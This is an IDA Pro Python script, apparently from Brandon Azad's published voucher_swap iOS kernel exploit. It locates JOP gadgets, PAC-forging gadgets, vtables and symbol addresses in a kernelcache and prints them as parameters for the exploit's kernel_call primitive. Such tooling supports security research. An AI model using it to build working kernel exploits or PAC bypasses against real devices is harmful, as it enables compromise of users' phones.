#
# voucher_swap/kernel_call_parameters.py
# Brandon Azad
#
# This script detects the kernel_call parameters for voucher_swap.
#
# Steps:
#   - Load the desired kernelcache into IDA Pro 7.2. Do not split by kext.
#   - Call analysis_init() to perform basic initialization of the kernelcache (converting pointers
#     to offsets, forcing instructions to code, etc.).
#   - Call voucher_swap_kernel_call_parameters() to find the kernel call parameters. These results
#     should be checked manually to ensure correctness!
#

from analysis import *

def voucher_swap_kernel_call_parameters():
    process_metaclasses()
    process_vtables()

    has_pac = kernelcache_has_pac()

    if has_pac:
        analyze_l2tp_domain_module()
        find_jop_gadgets()
        find_pacxa_gadget()
    analyze_IOUserClient()
    analyze_IORegistryEntry()
    if has_pac:
        analyze_IOAudio2DeviceUserClient()

def kernelcache_has_pac():
    header = get_segm_by_name('__TEXT:HEADER')
    cpu_subtype = idc.get_wide_dword(header + 0x8)
    return cpu_subtype >= 2

def analyze_l2tp_domain_module():
    # Get the pointers to l2tp_domain_module_start and l2tp_domain_module_stop.
    com_apple_nke_lttp = find_string('com.apple.nke.lttp')
    paciza_pointer__l2tp_domain_module_start = com_apple_nke_lttp + 0xb8
    paciza_pointer__l2tp_domain_module_stop  = com_apple_nke_lttp + 0xc0
    assert is_code_ptr(paciza_pointer__l2tp_domain_module_start)
    assert is_code_ptr(paciza_pointer__l2tp_domain_module_stop)
    print_address('paciza_pointer__l2tp_domain_module_start', paciza_pointer__l2tp_domain_module_start)
    print_address('paciza_pointer__l2tp_domain_module_stop',  paciza_pointer__l2tp_domain_module_stop)
    # Get the address of l2tp_domain_inited.
    l2tp_domain_init_str = find_substring('L2TP domain init')
    l2tp_domain_init     = functions_with_xref_to(l2tp_domain_init_str)[0]
    l2tp_domain_inited   = xrefs_from_func(l2tp_domain_init, ida_xref.dr_W)[0].to
    print_address('l2tp_domain_inited', l2tp_domain_inited)
    # Get the address of sysctl__net_ppp_l2tp.
    xrefs = xrefs_to(l2tp_domain_inited, ida_xref.dr_W)
    xrefs = filter(lambda xref: get_func_start(xref.frm) != l2tp_domain_init, xrefs)
    bb_start, bb_end = get_basic_block(xrefs[0].frm)
    sysctl__net_ppp_l2tp = xrefs_from_range(bb_start, bb_end, ida_xref.dr_O)[0].to
    print_address('sysctl__net_ppp_l2tp', sysctl__net_ppp_l2tp)
    # Get the address of sysctl_unregister_oid.
    sysctl_unregister_oid = xrefs_from_range(bb_start, bb_end, ida_xref.fl_CN)[0].to
    print_address('sysctl_unregister_oid', sysctl_unregister_oid)

def find_jop_gadgets():
    start_ea = get_segm_by_name('__TEXT_EXEC:__text')
    mov_x0_x4__br_x5  = idc.FindBinary(start_ea, idc.SEARCH_DOWN, "E0 03 04 AA  A0 00 1F D6")
    mov_x9_x0__br_x1  = idc.FindBinary(start_ea, idc.SEARCH_DOWN, "E9 03 00 AA  20 00 1F D6")
    mov_x10_x3__br_x6 = idc.FindBinary(start_ea, idc.SEARCH_DOWN, "EA 03 03 AA  C0 00 1F D6")
    print_address('mov_x0_x4__br_x5',  mov_x0_x4__br_x5)
    print_address('mov_x9_x0__br_x1',  mov_x9_x0__br_x1)
    print_address('mov_x10_x3__br_x6', mov_x10_x3__br_x6)

def find_pacxa_gadget():
    start_ea = get_segm_by_name('__TEXT_EXEC:__text')
    # These gadgets are much bigger than this: they encompass the entire function after the
    # specified entry point. But this should be enough to uniquely identify them.
    pacia_gadget = idc.FindBinary(start_ea, idc.SEARCH_DOWN,
            "49 01 C1 DA  49 78 00 F9  49 7C 40 F9  89 00 00 B4")
    pacda_gadget = idc.FindBinary(start_ea, idc.SEARCH_DOWN,
            "49 09 C1 DA  49 74 00 F9  89 F0 3C D5  29 01 7E B2")
    print_address('kernel_forge_pacia_gadget', pacia_gadget)
    print_address('kernel_forge_pacda_gadget', pacda_gadget)
    # Ideally we'd auto-detect these values by analyzing data flow in the function.
    print_size('kernel_forge_pacxa_gadget_buffer', 0x110)
    print_offset('kernel_forge_pacxa_gadget_buffer', 'first_access', 0xe8);
    print_offset('kernel_forge_pacxa_gadget_buffer', 'pacia_result', 0xf0);
    print_offset('kernel_forge_pacxa_gadget_buffer', 'pacda_result', 0xe8);

def analyze_IOUserClient():
    print_address('IOUserClient__vtable', vtable_for_class('IOUserClient'))

def analyze_IORegistryEntry():
    IORegistryEntry__getRegistryEntryID = idc.get_name_ea(idc.BADADDR,
            '__ZN15IORegistryEntry18getRegistryEntryIDEv')
    if IORegistryEntry__getRegistryEntryID == idc.BADADDR:
        IORegistryIterator_str = find_string('IORegistryIterator')
        base_func = functions_with_xref_to(IORegistryIterator_str)[1]
        IORegistryEntry__getRegistryEntryID = get_relative_func(base_func, -2)
    print_address('IORegistryEntry__getRegistryEntryID', IORegistryEntry__getRegistryEntryID)

def analyze_IOAudio2DeviceUserClient():
    vtable = vtable_for_class('IOAudio2DeviceUserClient')
    print_vtable_pac_codes('IOAudio2DeviceUserClient', extract_vtable_pac_codes(vtable))

# ---- Formatting ---------------------------------------------------------------------------------

def print_vtable_pac_codes(name, pac_codes):
    formatted_pac_codes = '\n\t\t'
    for i in range(len(pac_codes)):
        formatted_pac_codes += '0x{:04x}'.format(pac_codes[i])
        if i == len(pac_codes) - 1:
            pass
        elif i % 8 == 7:
            formatted_pac_codes += ',\n\t\t'
        else:
            formatted_pac_codes += ', '
    print 'INIT_VTABLE_PAC_CODES({},{});'.format(name, formatted_pac_codes)

def print_address(name, value):
    base = 'ADDRESS({})'.format(name)
    if is_mapped(value):
        value = 'SLIDE(0x{:016x})'.format(value)
    else:
        value = '0'
    print '{:56s}= {};'.format(base, value)

def print_size(name, value):
    base = 'SIZE({})'.format(name)
    print '{:56s}= 0x{:x};'.format(base, value)

def print_offset(base, field, value):
    base = 'OFFSET({}, {})'.format(base, field)
    print '{:56s}= 0x{:x};'.format(base, value)

